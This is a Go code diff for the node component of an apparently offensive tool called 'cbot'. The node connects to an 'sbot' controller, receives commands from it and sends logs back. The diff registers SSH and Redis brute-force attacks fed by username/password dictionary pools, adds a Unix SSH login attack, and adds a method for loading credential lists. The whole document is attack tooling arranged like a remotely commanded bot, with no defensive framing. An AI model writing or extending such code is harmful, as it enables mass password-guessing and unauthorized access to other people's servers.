@@ -4,6 +4,8 @@ import (
 	"fmt"
 	"github.com/cbot/attack"
 	"github.com/cbot/attack/ascript"
+	"github.com/cbot/attack/bruteforce"
+	"github.com/cbot/attack/unix"
 	"github.com/cbot/client"
 	"github.com/cbot/logstream"
 	"github.com/cbot/targets/local"
@@ -32,15 +34,41 @@ type Node struct {
 	nodeInfo *local.NodeInfo
 
 	logStream *logstream.LogStream
+
+	dictPools map[string]*bruteforce.DictPool
+
+	unixAttack *unix.UnixSSHLoginAttack
 }
 
 func NewNode(cfg *Config) *Node {
 
+	nodeInfo := local.GetNodeInfo()
+	spool := source.NewSourcePool()
+
+	attackTasks := attack.NewAttackTasks(&attack.Config{
+		MaxThreads:            cfg.MaxThreads,
+		SourceCapacity:        cfg.SourceCapacity,
+		AttackProcessCapacity: cfg.AttackProcessCapacity,
+		SBotHost:              cfg.SbotHost,
+		SBotPort:              cfg.SbotFileServerPort,
+	}, nodeInfo, spool)
+
+	dictpools := map[string]*bruteforce.DictPool{
+		"ssh":   bruteforce.NewDictPool(),
+		"redis": bruteforce.NewDictPool(),
+	}
+
+	attackTasks.AddAttack(bruteforce.NewSSHBruteforceAttack(dictpools["ssh"], attackTasks))
+	attackTasks.AddAttack(bruteforce.NewRedisBruteforceAttack(dictpools["redis"], attackTasks))
+
 	return &Node{
-		cfg:         nil,
-		spool:       nil,
-		attackTasks: nil,
-		nodeInfo:    local.GetNodeInfo(),
+		cfg:         cfg,
+		spool:       spool,
+		attackTasks: attackTasks,
+		nodeInfo:    nodeInfo,
+		logStream:   logstream.NewLogStream(),
+		dictPools:   dictpools,
+		unixAttack:  unix.NewUnixSSHLoginAttack(attackTasks),
 	}
 
 }
@@ -63,6 +91,8 @@ func (n *Node) Start() error {
 		return fmt.Errorf("Cannot connect to sbot:%v", err)
 	}
 
+	n.logStreamClient = client.NewLogStreamClient(n, n.grpcClient, n.logStream)
+
 	//connect to sbot,and create node
 	n.nodeClient = client.NewNodeClient(n, n.grpcClient)
 	n.nodeId, err = n.nodeClient.CreateNode()
@@ -77,19 +107,25 @@ func (n *Node) Start() error {
 		return fmt.Errorf("Create command node client failed:%v", err)
 	}
 
-	n.logStream = logstream.NewLogStream()
-	n.logStreamClient = client.NewLogStreamClient(n, n.grpcClient, n.logStream)
+	//setup command client to receive cmd from sbot
+	if err = n.cmdClient.Start(); err != nil {
 
-	//create attack sources
-	n.spool = source.NewSourcePool()
+		return fmt.Errorf("Cannot start command client to receive cmd from sbot:%v", err)
+	}
 
-	n.attackTasks = attack.NewAttackTasks(&attack.Config{
-		MaxThreads:            n.cfg.MaxThreads,
-		SourceCapacity:        n.cfg.SourceCapacity,
-		AttackProcessCapacity: n.cfg.AttackProcessCapacity,
-		SBotHost:              n.cfg.SbotHost,
-		SBotPort:              n.cfg.SbotFileServerPort,
-	}, n.nodeInfo, n.spool)
+	//setup logstream client to send log to sbot
+	if err = n.logStreamClient.Start(); err != nil {
+
+		return fmt.Errorf("Cannot start logstream client to send log to sbot:%v", err)
+	}
+
+	//setup attack tasks
+	n.attackTasks.Start()
+
+	//setup unix attack
+	n.unixAttack.Start()
+
+	n.waitAttackProcess()
 
 	return nil
 }
@@ -128,6 +164,20 @@ func (n *Node) AddAttack(name string, attackType string, defaultProto string, de
 	}
 
 	n.attackTasks.AddAttack(att)
+
+	return nil
+}
+
+func (n *Node) AddDict(name string, users []string, passwds []string) error {
+
+	dictpool, ok := n.dictPools[name]
+
+	if !ok {
+
+		return fmt.Errorf("Cannot find dictory pool for name:%s", name)
+	}
+
+	dictpool.Add(users, passwds)
 
 	return nil
 }
